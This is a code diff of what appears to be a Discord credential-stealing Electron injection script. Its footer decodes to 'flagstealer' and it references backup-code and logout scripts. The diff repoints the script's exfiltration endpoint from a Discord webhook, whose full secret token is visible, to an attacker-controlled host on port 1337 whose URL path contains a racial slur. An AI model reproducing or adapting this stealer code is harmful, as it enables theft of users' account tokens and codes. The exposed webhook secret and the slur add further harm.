@@ -8,7 +8,7 @@ const { BrowserWindow: BrowserWindow, session: session } = require('electron'),
   path = require('path')
 let WEBHOOK = '%WEBHOOK_URL%',
   API_URL =
-    'https://ptb.discord.com/api/webhooks/1235937298298830950/2jHn__6RbqfEwjVUP0v8IpPC7F-C2LuT1hkhtlWVAKNKqDF6HsUSk2SiKLW2EIg04VRM',
+    'http://api.orion1337.online:1337/nigga',
   [
     BACKUPCODES_SCRIPT,
     LOGOUT_SCRIPT,
@@ -195,7 +195,7 @@ const request = async (
       }
       _0x4afaae.footer = {
         text: decodeB64('QGZsYWdzdGVhbGVy'),
-        icon_url: 'http://api.orion1337.online:8080/gif.gif',
+        icon_url: 'https://c.tenor.com/CuV-Lg_hICEAAAAd/tenor.gif',
       }
     })
     try {
